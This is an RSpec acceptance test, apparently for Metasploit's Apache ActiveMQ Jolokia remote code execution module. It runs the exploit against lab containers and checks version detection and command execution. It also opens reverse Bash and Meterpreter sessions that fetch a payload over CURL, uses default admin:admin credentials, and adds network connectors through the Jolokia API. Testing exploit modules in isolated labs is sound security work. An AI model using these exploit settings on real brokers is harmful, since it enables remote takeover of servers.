require 'acceptance_spec_helper'
require 'rbconfig'
require 'timeout'
require_relative '../../../test/module_targets/activemq_jolokia/native_probe'

RSpec.describe 'Genuine ActiveMQ Jolokia execution' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/activemq_jolokia/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-jolokia.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-jolokia-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    expect(stderr).to eq('')
    @original_tmp = %w[affected prefix fixed].to_h { |service| [service, tmp_files(service)] }
  end

  after do
    stop_handlers
    services_closed
    %w[affected prefix fixed].each { |service| restore_tmp(service, @original_tmp.fetch(service)) } if @original_tmp
  end

  after(:all) do
    %w[affected prefix fixed].each do |service|
      File.write(File.join(target_runtime.fetch('artifacts'), "vendor-#{service}.log"), target_exec(service, 'cat', '/opt/activemq/data/activemq.log'))
    end
  end

  %w[affected prefix].each do |service|
    it "checks the actual affected #{service} product/version twice" do
      2.times do
        output = invoke(service, {}, action: 'check')
        expect(output).to include('5.19.3')
        expect(output).to match(/appears to be vulnerable/i)
      end
    end
  end

  it 'checks the actual fixed release twice without a false vulnerability result' do
    2.times do
      output = invoke('fixed', {}, action: 'check', allow_errors: true)
      expect(output).to include('5.19.4')
      expect(output).to match(/not exploitable/i)
    end
  end

  it 'does not identify genuine unrelated Apache HTTP as vulnerable' do
    2.times do
      output = invoke('unrelated', {}, action: 'check', allow_errors: true)
      expect(output).to match(/Cannot reliably check exploitability|not exploitable/i)
      expect(output).not_to match(/appears to be vulnerable|target is vulnerable/i)
    end
  end

  it 'does not identify refused HTTP credentials as vulnerable' do
    output = invoke('affected', { 'PASSWORD' => 'module-target-invalid' }, action: 'check', allow_errors: true)
    expect(output).to match(/Cannot reliably check exploitability/i)
    expect(output).to match(/Authentication|401/i)
  end

  it 'does not identify a genuine missing prefix context as vulnerable' do
    output = invoke('prefix', { 'TARGETURI' => '/module-target/missing/' }, action: 'check', allow_errors: true)
    expect(output).to match(/Cannot reliably check exploitability|not exploitable/i)
    expect(output).not_to match(/appears to be vulnerable|target is vulnerable/i)
  end

  it 'refuses the fixed release through AutoCheck without creating target state' do
    path = '/tmp/module-target-jolokia-refused'
    target_exec('fixed', 'test', '!', '-e', path)
    original = graph('fixed')
    output = invoke('fixed', { 'CMD' => "touch #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
    expect(output).to match(/not-vulnerable|not exploitable/i)
    expect(output).not_to include('Sending Jolokia exploit request')
    target_exec('fixed', 'test', '!', '-e', path)
    expect(graph('fixed')).to eq(original)
  end

  it 'executes Linux commands with an explicit broker twice and removes only created state' do
    command_twice('affected', 'Linux root <&> "quote"', 'TARGET' => 1, 'BROKER_NAME' => profile('affected').fetch(:broker))
  end

  it 'discovers a genuine prefixed custom broker and executes Unix commands twice' do
    command_twice('prefix', 'Unix prefix <&> "quote"', 'TARGET' => 2)
  end

  it 'initializes discovery and execution with AutoCheck disabled on both repetitions' do
    command_twice('affected', 'AutoCheck disabled', 'AutoCheck' => false)
  end

  it 'serves and executes command XML with the payload handler disabled twice' do
    command_twice('affected', 'Handler disabled', 'BROKER_NAME' => profile('affected').fetch(:broker), 'DisablePayloadHandler' => true)
  end

  it 'refuses incorrect credentials at execution without a command or connector' do
    path = '/tmp/module-target-jolokia-auth-refused'
    target_exec('affected', 'test', '!', '-e', path)
    original = graph('affected')
    output = invoke('affected', { 'AutoCheck' => false, 'PASSWORD' => 'module-target-invalid', 'CMD' => "touch #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
    expect(output).to match(/Authentication|NoAccess|no-access|401/i)
    target_exec('affected', 'test', '!', '-e', path)
    expect(graph('affected')).to eq(original)
  ensure
    reset_connector('affected')
    target_exec('affected', 'rm', '-f', path) if path
  end

  it 'rejects invalid CDATA before sending or creating a network connector' do
    path = '/tmp/module-target-jolokia-cdata'
    target_exec('affected', 'test', '!', '-e', path)
    original = graph('affected')
    output = invoke('affected', { 'BROKER_NAME' => profile('affected').fetch(:broker), 'CMD' => "printf ']]>' > #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
    expect(output).to match(/CDATA|bad-config|BadConfig/i)
    expect(output).not_to include('Sending Jolokia exploit request')
    target_exec('affected', 'test', '!', '-e', path)
    expect(graph('affected')).to eq(original)
  ensure
    reset_connector('affected')
    target_exec('affected', 'rm', '-f', path) if path
  end

  it 'opens two fresh Unix Bash sessions with exact owner and state restoration' do
    session_twice('affected', 'cmd/unix/reverse_bash', 'TARGET' => 2, 'BROKER_NAME' => profile('affected').fetch(:broker))
  end

  [8080, 8081].each do |port|
    it "opens two genuine Linux Meterpreter sessions with fetch port #{port} and complete cleanup" do
      session_twice('prefix', 'cmd/linux/http/x64/meterpreter/reverse_tcp', 'TARGET' => 1, 'BROKER_NAME' => profile('prefix').fetch(:broker), 'FETCH_SRVPORT' => port)
    end
  end

  it 'executes with the independently accepted vendor user role on both repetitions' do
    command_twice('affected', 'Vendor user role', 'USERNAME' => 'user', 'PASSWORD' => 'user', 'BROKER_NAME' => profile('affected').fetch(:broker))
  end

  it 'preserves an existing genuine TCP bridge or safely refuses without replacing it' do
    service = 'affected'
    path = '/tmp/module-target-jolokia-canary'
    target_exec(service, 'test', '!', '-e', path)
    expect(graph(service).fetch('connectors')).to be_empty
    result = api(service, { type: 'exec', mbean: mbean(service), operation: 'addNetworkConnector(java.lang.String)', arguments: ['static:(tcp://fixed:61616)'] })
    expect(result).to include('status' => 200, 'value' => 'NC')
    Timeout.timeout(5) { wait_for_expect(51, 0.1) { expect(graph(service).fetch('bridges')).not_to be_empty } }
    original = graph(service)
    invoke(service, { 'BROKER_NAME' => profile(service).fetch(:broker), 'CMD' => "touch #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
    # invoke already rejects Ruby failures; Java exception names in HttpTrace
    # are vendor response data. Preservation requires the actual bridge graph.
    expect(graph(service)).to eq(original)
  ensure
    reset_connector(service) if service
    target_exec(service, 'rm', '-f', path) if service && path
  end

  def profile(service)
    NativeActiveMqJolokiaProbe::PROFILES.fetch(service)
  end

  def invoke(service, options, action: 'run -z', allow_errors: false)
    base = service == 'unrelated' ? '/' : "#{profile(service).fetch(:base)}/"
    values = {
      'TARGET' => 1, 'PAYLOAD' => 'cmd/unix/generic', 'USERNAME' => 'admin', 'PASSWORD' => 'admin',
      'BROKER_NAME' => '', 'TARGETURI' => base, 'AutoCheck' => true, 'DisablePayloadHandler' => false,
      'SRVHOST' => listener_host, 'SRVPORT' => 8080, 'URIPATH' => '/module-target/context',
      'WfsDelay' => 3, 'VERBOSE' => true, 'HttpTrace' => true
    }.merge(options)
    console_command('back')
    selected = console_command('use exploit/multi/http/apache_activemq_jolokia_rce')
    expect(selected).not_to match(/Failed to load|Unknown command|No results/)
    %w[TARGET PAYLOAD].each do |name|
      configured = console_command("set #{name} #{values.fetch(name)}")
      expect(configured).not_to match(/Failed|Invalid|not found/)
    end
    endpoint = target_runtime.fetch('module_endpoints').fetch(service)
    datastore = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port') }.merge(values)
    output = console_command("#{action} #{format_datastore_options(datastore)}", timeout: 70)
    # Raw HttpTrace retains genuine Java exception types inside HTTP JSON.
    # Identify Framework failures without mistaking vendor response data for a
    # Ruby backtrace or changing that response. Positive warnings are gated below.
    expect(output).not_to match(/undefined method|uninitialized constant|NoMethodError|NameError|TypeError|ArgumentError|RuntimeError|JSON::ParserError|Msf::OptionValidateError/)
    expect(output).not_to include('[-]') unless allow_errors
    output
  end

  def positive_output(output)
    expect(output).to include('Malicious Spring XML served')
    expect(output).not_to match(/Exploit aborted|Exploit failed|Jolokia returned status|Unexpected HTTP status|Could not parse Jolokia|Jolokia POST timed out/)
    expect(output).not_to match(/Creation was not confirmed|Could not remove the network connector|Removal of the network connector.*not confirmed/)
  end

  def command_twice(service, content, options)
    path = '/tmp/module-target-jolokia-command'
    begin
      2.times do
        original = graph(service)
        expect(original.fetch('connectors')).to be_empty
        files = tmp_files(service)
        target_exec(service, 'test', '!', '-e', path)
        output = invoke(service, { 'CMD' => "printf '%s' '#{content}' > #{path}" }.merge(options))
        positive_output(output)
        Timeout.timeout(10) { wait_for_expect(101, 0.1) { expect(owner(service, path)).to eq('activemq') } }
        expect(target_exec(service, 'cat', path)).to eq(content)
        target_exec(service, 'rm', path)
        restore_tmp(service, files)
        expect(graph(service)).to eq(original)
        stop_handlers
        services_closed
      end
    ensure
      stop_handlers
      reset_connector(service)
      target_exec(service, 'rm', '-f', path)
    end
  end

  def session_twice(service, payload, options)
    path = '/tmp/module-target-jolokia-session'
    meterpreter = payload.include?('meterpreter')
    begin
      2.times do |index|
        original = graph(service)
        expect(original.fetch('connectors')).to be_empty
        files = tmp_files(service)
        target_exec(service, 'test', '!', '-e', path)
        values = { 'PAYLOAD' => payload, 'DisablePayloadHandler' => false, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10 }.merge(options)
        if meterpreter
          values.merge!(
            'FETCH_SRVHOST' => listener_host, 'FETCH_URIPATH' => '/module-target/payload', 'FETCH_COMMAND' => 'CURL',
            'FETCH_FILENAME' => "module-target-jolokia-fetch-#{service}-#{values.fetch('FETCH_SRVPORT')}-#{index}",
            'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_DELETE' => true
          )
        end
        output = invoke(service, values)
        positive_output(output)
        identifier = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
        expect(identifier).not_to be_nil, output
        command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "touch #{path}"
        proof = console_command("sessions -i #{identifier} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
        expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
        Timeout.timeout(10) { wait_for_expect(101, 0.1) { expect(owner(service, path)).to eq('activemq') } }
        stop_handlers
        target_exec(service, 'rm', path)
        restore_tmp(service, files)
        expect(graph(service)).to eq(original)
        services_closed
      end
    ensure
      stop_handlers
      reset_connector(service)
      target_exec(service, 'rm', '-f', path)
    end
  end

  def owner(service, path)
    target_exec(service, 'sh', '-c', "if test -f #{path}; then stat -c %U #{path}; fi").strip
  end

  def tmp_files(service)
    target_exec(service, 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-printf', "%f\n").lines.map(&:strip).sort
  end

  def restore_tmp(service, original)
    Timeout.timeout(10) { wait_for_expect(101, 0.1) { expect(tmp_files(service)).to eq(original) } }
  end

  def stop_handlers
    console_command('sessions -K')
    console_command('jobs -K')
  end

  def services_closed
    code = 'puts "MODULE_TARGET_HTTP=" + JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).map { |server| {port: server.listen_port, resources: server.resources.keys} })'
    output = console_command("irb -e '#{code}'")
    expect(JSON.parse(output.match(/^MODULE_TARGET_HTTP=(.*)$/)[1])).to eq([])
    [8080, 8081].each do |port|
      %w[/module-target/context /module-target/payload].each do |path|
        result = target_exec('affected', 'sh', '-c', "curl --silent --output /dev/null --write-out '%{http_code}' --connect-timeout 1 --max-time 1 http://#{listener_host}:#{port}#{path}; printf ':%s' \"$?\"") # rubocop:disable Style/FormatStringToken
        expect(result).to eq('000:7')
      end
    end
  end

  def mbean(service)
    "org.apache.activemq:type=Broker,brokerName=#{profile(service).fetch(:broker)}"
  end

  def api(service, body)
    url = "http://127.0.0.1:8161#{profile(service).fetch(:base)}/api/jolokia/"
    output = target_exec(service, 'curl', '--silent', '--show-error', '--globoff', '--max-time', '5',
                         '--user', 'admin:admin', '--header', 'Origin: http://127.0.0.1:8161',
                         '--header', 'Content-Type: application/json', '--data', JSON.generate(body),
                         '--write-out', "\nMODULE_TARGET_HTTP_CODE=%{http_code}", url) # rubocop:disable Style/FormatStringToken
    text, marker, status = output.rpartition("\nMODULE_TARGET_HTTP_CODE=")
    expect(marker).not_to be_empty
    expect(status).to eq('200')
    result = JSON.parse(text)
    File.open(File.join(target_runtime.fetch('artifacts'), 'native-jolokia-state.jsonl'), 'a') do |file|
      file.puts(JSON.generate(service: service, request: body, http_code: status, result: result))
    end
    result
  end

  def search(service, query)
    result = api(service, { type: 'search', mbean: query })
    expect(result.fetch('status')).to eq(200)
    result.fetch('value').sort
  end

  def graph(service)
    {
      'connectors' => search(service, "#{mbean(service)},connector=networkConnectors,networkConnectorName=*"),
      'bridges' => search(service, "#{mbean(service)},connector=networkConnectors,networkConnectorName=*,networkBridge=*")
    }
  end

  def reset_connector(service)
    connectors = graph(service).fetch('connectors')
    return if connectors.empty?

    # The assertion preceding this fixture restoration remains failed. Only NC
    # can have been created in this isolated test namespace; never erase others.
    expect(connectors).to all(match(/(?:^|,)networkConnectorName=NC(?:,|$)/))
    result = api(service, { type: 'exec', mbean: mbean(service), operation: 'removeNetworkConnector(java.lang.String)', arguments: ['NC'] })
    expect(result).to include('status' => 200, 'value' => true)
    expect(graph(service).fetch('connectors')).to be_empty
  end
end
